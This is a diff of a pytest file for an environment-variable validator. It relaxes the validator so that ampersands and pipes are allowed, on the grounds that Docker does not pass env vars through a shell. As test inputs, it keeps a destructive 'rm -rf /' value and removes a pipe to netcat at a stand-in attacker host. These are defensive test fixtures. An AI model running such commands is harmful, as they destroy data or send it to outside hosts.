@@ -644,15 +644,19 @@ class TestEnvironmentVariableValidation:
         with pytest.raises(ValidationError, match="dangerous character.*;"):
             validate_environment_variable("MALICIOUS", "value; rm -rf /")
 
-    def test_validate_environment_variable_ampersand(self) -> None:
-        """Test rejecting environment variables with background execution."""
-        with pytest.raises(ValidationError, match="dangerous character.*&"):
-            validate_environment_variable("MALICIOUS", "value & malicious_command")
+    def test_validate_environment_variable_ampersand_allowed(self) -> None:
+        """Test allowing ampersands in connection strings (common in URLs, database strings)."""
+        # Ampersands are safe - Docker passes env vars as structured data, not through shell
+        key, value = validate_environment_variable(
+            "DATABASE_URL", "postgres://localhost?sslmode=require&pool=10"
+        )
+        assert value == "postgres://localhost?sslmode=require&pool=10"
 
-    def test_validate_environment_variable_pipe(self) -> None:
-        """Test rejecting environment variables with pipe."""
-        with pytest.raises(ValidationError, match="dangerous character.*\\|"):
-            validate_environment_variable("MALICIOUS", "value | nc attacker.com 1234")
+    def test_validate_environment_variable_pipe_allowed(self) -> None:
+        """Test allowing pipes in values (only dangerous if value used in shell command)."""
+        # Pipes are safe - Docker passes env vars as structured data, not through shell
+        key, value = validate_environment_variable("FILTER", "status=active|ready")
+        assert value == "status=active|ready"
 
     def test_validate_environment_variable_newline(self) -> None:
         """Test rejecting environment variables with newline injection."""
